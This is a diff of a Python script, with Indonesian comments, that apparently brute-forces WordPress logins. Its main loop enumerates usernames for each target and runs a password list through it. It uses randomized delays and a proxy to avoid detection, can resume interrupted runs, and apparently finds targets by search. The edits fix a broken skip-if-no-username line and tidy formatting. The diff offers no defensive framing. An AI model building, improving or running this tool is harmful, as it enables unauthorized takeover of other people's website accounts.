@@ -15,10 +15,10 @@ import subprocess
 from pathlib import Path
 from typing import List, Optional, Tuple
 
-# ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+# ──────────────────────────────────────────────────────────────────────────────
 # OPTIONAL DEPENDENCY: googlesearch
 # pip install googlesearch-python
-# ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+# ──────────────────────────────────────────────────────────────────────────────
 try:
     from googlesearch import search
 except ImportError:
@@ -291,23 +291,26 @@ def main():
     for tgt in targets:
         logging.info("=== Memproses target: %s ===", tgt)
 
-        # Username
+        # Tentukan username
         if args.username:
             user = args.username
         else:
             users = get_usernames(tgt, args.timeout)
-            user = pilih_username(users) or continue
+            user = pilih_username(users)
+            if not user:
+                logging.warning("Tidak ada username untuk %s, dilewati.", tgt)
+                continue
 
-        # Brute-force
+        # Mulai brute-force
         logging.info("Mulai brute-force %s dengan %d password", user, len(pwds))
         found = bruteforce_wp(
-            target_url=tgt,
-            username=user,
-            passwords=pwds,
-            timeout=args.timeout,
-            delay_range=(args.delay[0], args.delay[1]),
-            resume_file=Path(args.resume_file),
-            proxy=args.proxy,
+            target_url  = tgt,
+            username    = user,
+            passwords   = pwds,
+            timeout     = args.timeout,
+            delay_range = (args.delay[0], args.delay[1]),
+            resume_file = Path(args.resume_file),
+            proxy       = args.proxy,
         )
 
         if found:
